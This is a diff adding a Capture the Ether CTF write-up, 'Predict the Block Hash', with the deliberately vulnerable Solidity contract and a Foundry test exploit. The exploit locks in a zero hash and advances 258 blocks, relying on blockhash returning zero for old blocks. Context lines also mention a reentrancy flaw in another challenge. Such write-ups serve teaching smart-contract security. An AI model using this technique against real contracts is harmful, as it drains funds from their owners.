@@ -596,3 +596,96 @@ However, achieving that is straightforward by using the following sequence of ac
 Performing the above steps solves the challenge.
 
 NOTE: The original Capture the Ether challenge does _not_ contain the `addcontract` function. However, notice that `withdraw` doesn't follow the checks-effects-interactions pattern and is, therefore, vulnerable to reentrancy. (Note that `transfer` calls `tokenFallback` on the receiver.) A detailed solution for this original case is explained in [Christoph Michel's Capture the Ether blog post](https://cmichel.io/capture-the-ether-solutions/).
+
+## Capture the Ether (RareSkills Repo) - Predict the Block Hash
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+//Challenge
+contract PredictTheBlockhash {
+    address guesser;
+    bytes32 guess;
+    uint256 settlementBlockNumber;
+
+    constructor() payable {
+        require(msg.value == 1 ether, "Requires 1 ether to create this contract");
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function lockInGuess(bytes32 hash) public payable {
+        require(guesser == address(0), "Requires guesser to be zero address");
+        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");
+
+        guesser = msg.sender;
+        guess = hash;
+        settlementBlockNumber = block.number + 1;
+    }
+
+    function settle() public {
+        require(msg.sender == guesser, "Requires msg.sender to be guesser");
+        require(block.number > settlementBlockNumber, "Requires block.number to be more than settlementBlockNumber");
+
+        bytes32 answer = blockhash(settlementBlockNumber);
+
+        guesser = address(0);
+        if (guess == answer) {
+            (bool ok,) = msg.sender.call{value: 2 ether}("");
+            require(ok, "Transfer to msg.sender failed");
+        }
+    }
+}
+```
+
+### Exploit
+
+To exploit this contract, it's important to know that `blockhash` only returns the actual block hash for the last 256 blocks due to performance reasons. For any blocks that lie further in the past, `blockhash` will return `0x0000000000000000000000000000000000000000000000000000000000000000`.
+
+Therefore, we can call `lockInGuess` with `hash = 0x0000000000000000000000000000000000000000000000000000000000000000`, wait until the corresponding block lies far enough in the past, and finally call `settle`.
+
+_PredictTheBlockhash.t.sol_
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
+import "../src/PredictTheBlockhash.sol";
+
+contract PredictTheBlockhashTest is Test {
+    PredictTheBlockhash public predictTheBlockhash;
+
+    function setUp() public {
+        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
+    }
+
+    function testExploit() public {
+        // Set block number
+        uint256 blockNumber = block.number;
+
+        // Put your solution here
+        predictTheBlockhash.lockInGuess{value: 1 ether}(
+            0x0000000000000000000000000000000000000000000000000000000000000000
+        );
+
+        vm.roll(blockNumber + 258);
+        predictTheBlockhash.settle();
+
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
+    }
+
+    receive() external payable {}
+}
+```
